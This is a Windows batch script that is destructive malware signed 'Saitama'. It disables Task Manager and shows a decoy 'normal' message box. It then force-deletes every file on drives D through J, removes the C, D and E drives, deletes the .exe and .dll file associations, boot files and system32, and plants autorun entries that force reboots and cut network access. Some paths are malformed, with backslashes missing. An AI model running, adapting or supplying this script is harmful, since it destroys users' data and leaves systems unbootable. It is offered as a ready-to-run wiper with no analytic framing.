@shift /0
@echo off
ECHO REGEDIT4 > %WINDIR%\DXM.REG
echo. >> %WINDIR%\DXM.reg

echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1 >> %WINDIR%\DXM.reg

echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
echo "DisableTaskMgr"=dword:1 >> %WINDIR%\DXM.reg

start /w regedit /s %WINDIR%\DXM.reg
echo x=msgbox("Just a normal VBS msgbox",0+64,"Saitama") >0.vbs
start 0.vbs
timeout 1
del 0.vbs
timeout 10
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
Ipconfig /release
rd/s/q D:\
rd/s/q C:\
rd/s/q E:\
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
del c:\WINDOWS\system32\*.*/q
shutdown -r -t 6 -c Killed by Saitama
